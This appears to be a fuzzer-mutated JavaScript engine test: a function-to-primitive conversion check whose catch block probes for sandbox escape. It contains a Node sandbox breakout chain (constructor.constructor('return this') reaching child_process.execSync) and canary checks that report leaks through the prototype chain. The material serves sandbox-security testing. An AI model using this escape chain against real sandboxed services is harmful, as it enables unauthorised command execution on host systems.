try {
    function f1() {
        let REPLACER = 23;
        return 0;
    }
    if (f1 + 1 !== f1.toString() + 1) {
        $ERROR('#1: function f1() {return 0;}; f1 + 1 === f1.toString() + 1');
    }
    function f2() {
        let REPLACER = 23;
        return 0;
    }
    f2.valueOf = function () {
        let REPLACER = 23;
        return 1;
    };
    if (1 + f2 !== 1 + 1) {
        $ERROR('#2: f1unction f2() {return 0;} f2.valueOf = function() {return 1;}; 1 + f2 === 1 + 1. Actual: ' + (1 + f2));
    }
    function f3() {
        let REPLACER = 23;
        return 0;
    }
    f3.toString = function () {
        throw () => {
            return () => {
            };
        };
        return 1;
    };
    if (1 + f3 !== 1 + 1) {
        $ERROR('#3: f1unction f3() {return 0;} f3.toString() = function() {return 1;}; 1 + f3 === 1 + 1. Actual: ' + (1 + f3));
    }
    function f4() {
        return 0;
    }
    f4.valueOf = function () {
        return -1;
    };
    f4.toString = function () {
        return 1;
    };
    if (f4 + 1 !== 1 - 1) {
        $ERROR('#4: f1unction f4() {return 0;}; f2.valueOf = function() {return -1;}; f4.toString() = function() {return 1;}; f4 + 1 === 1 - 1. Actual: ' + (f4 + 1));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}